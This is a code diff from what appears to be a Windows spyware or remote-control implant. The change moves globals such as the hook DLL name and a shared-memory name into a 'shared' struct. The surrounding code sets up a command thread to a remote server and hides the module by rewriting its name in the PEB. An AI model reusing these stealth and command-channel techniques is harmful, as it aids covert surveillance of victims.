@@ -10,6 +10,7 @@
 #include "aes_alg.h"
 #include <string.h>
 #include "x64.h"
+#include "bss.h"
 
 #define ASP_SLEEP_TIME 20
 #define ASP_START_TIMEOUT 60000 // un minuto di attesa per far inizializzare il processo host ASP
@@ -22,8 +23,6 @@
 
 HINTERNET asp_global_request = 0; // Handle usato dalle winhttp per inviare/ricevere dati
 BYTE asp_global_session_key[16];
-
-extern char SHARE_MEMORY_ASP_COMMAND_NAME[MAX_RAND_NAME];
 
 // --- Altri prototipi usati dal thread ASP ---
 typedef void (__stdcall *ASP_MainLoop_t) (char *);
@@ -176,7 +175,7 @@ DWORD ASP_Setup(char *asp_server)
 	VALIDPTR(ASPThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
 	VALIDPTR(ASPThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));
 
-	HM_CompletePath(H4DLLNAME, ASPThreadData.cDLLHookName);
+	HM_CompletePath(shared.H4DLLNAME, ASPThreadData.cDLLHookName);
 	_snprintf_s(ASPThreadData.cASPServer, sizeof(ASPThreadData.cASPServer), _TRUNCATE, "%s", asp_server);
 	_snprintf_s(ASPThreadData.cASPMainLoop, sizeof(ASPThreadData.cASPMainLoop), _TRUNCATE, "PPPFTBBP07");
 
@@ -190,7 +189,7 @@ DWORD ASP_Setup(char *asp_server)
 // Usata dall'host ASP per attaccarsi alla shared memory
 BOOL ASP_IPCAttach()
 {
-	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, SHARE_MEMORY_ASP_COMMAND_NAME);
+	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_ASP_COMMAND_NAME);
 
 	// Riutilizza ASP_IPC_command tanto non l'host ASP non lo condivide 
 	// con il core
@@ -207,7 +206,7 @@ BOOL ASP_IPCAttach()
 // Inizializza nel core la shared memory per ASP
 BOOL ASP_IPCSetup()
 {
-	hASPIPCcommandfile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPCCommandDataStruct), SHARE_MEMORY_ASP_COMMAND_NAME);
+	hASPIPCcommandfile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPCCommandDataStruct), shared.SHARE_MEMORY_ASP_COMMAND_NAME);
 	if (hASPIPCcommandfile)
 		ASP_IPC_command = (ASP_IPCCommandDataStruct *)FNC(MapViewOfFile)(hASPIPCcommandfile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPCCommandDataStruct));
 
@@ -1133,7 +1132,7 @@ void __stdcall  ASP_MainLoop(char *asp_server)
 	asp_reply_setup *reply_setup;
 
 	// Modifica il nome del modulo nella peb
-	HidePEB(GetModuleHandle(H4DLLNAME));
+	HidePEB(GetModuleHandle(shared.H4DLLNAME));
 
 	// Al ritorno ASP_IPC_command e' sicuramente valorizzato.
 	// Non fa il detach tanto alla fine il processo sara' chiuso 
